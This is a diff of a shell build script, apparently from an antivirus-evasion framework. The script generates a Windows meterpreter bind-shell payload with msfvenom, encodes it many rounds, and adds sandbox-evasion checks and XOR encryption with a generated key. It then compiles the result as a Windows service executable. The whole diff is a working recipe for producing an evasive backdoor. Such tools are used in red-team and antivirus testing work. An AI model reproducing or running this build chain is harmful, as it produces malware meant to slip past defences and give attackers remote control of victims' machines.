@@ -16,11 +16,44 @@ LPORT=$GLOBAL_LPORT
 # make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
 
-# call make_avetsvc, the sandbox escape is due to the many rounds of decoding the shellcode
-./make_avetsvc -f sc.txt
+# import feature construction interface
+. build/feature_construction.sh
 
-# compile to pwn.exe file
-$win32_compiler -o output/pwnsvc.exe source/avetsvc.c
-strip output/pwnsvc.exe
+# add evasion techniques
+add_evasion fopen_sandbox_evasion
+add_evasion gethostbyname_sandbox_evasion
+printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
+#add_evasion hide_console
+
+# generate key file
+generate_key preset aabbcc12de input/keyraw.txt
+
+# encode shellcode
+encode_shellcode xor input/scraw.txt input/scenc.txt input/keyraw.txt
+
+# array name buf is expected by static_from_file retrieval method
+./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/scenc_c.txt buf
+
+# set shellcode source
+set_shellcode_source static_from_file input/scenc_c.txt
+
+# convert generated key from raw to C into array "key"
+./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key_c.txt key
+
+# set key source
+set_key_source static_from_file input/key_c.txt
+
+# set decoder
+set_decoder xor
+
+# set shellcode binding technique
+set_shellcode_binding exec_shellcode
+
+# enable debug printing
+#enable_debug_print
+
+# compile as service
+$win32_compiler -o output/service.exe source/avetsvc.c -lws2_32
 
 # cleanup
+cleanup_techniques
